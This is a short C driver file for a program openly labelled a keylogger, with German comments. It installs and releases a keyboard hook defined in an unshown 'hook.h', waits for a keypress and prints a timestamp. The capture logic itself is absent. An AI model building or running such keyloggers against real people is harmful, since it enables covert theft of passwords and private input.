#include <stdio.h>
#include "hook.h"

int main() {
    
    // Setzt den Hook
    if (SetKeyboardHook()) {
        printf("Keylogger is running... Press any key to stop.\n");

        // Programmschleife, die läuft, bis eine Taste gedrückt wird
        // In einer echten Anwendung würde hier eine komplexere Schleife mit Nachrichtenverarbeitung laufen
        getchar();

        // Gibt den Hook frei, wenn das Programm beendet wird
        ReleaseKeyboardHook();
        printf("Keylogger has stopped.\n");
    } else {
        printf("Failed to install keyboard hook!\n");
    }

    char* timestamp = GetCurrentTimestamp();
    if (timestamp != NULL) {
        printf("Current Timestamp: %s\n", timestamp);
        free(timestamp); //Speicher freigeben, der von GetCurrentTimestamp zugewiesen wurde
    }

    return 0;
}
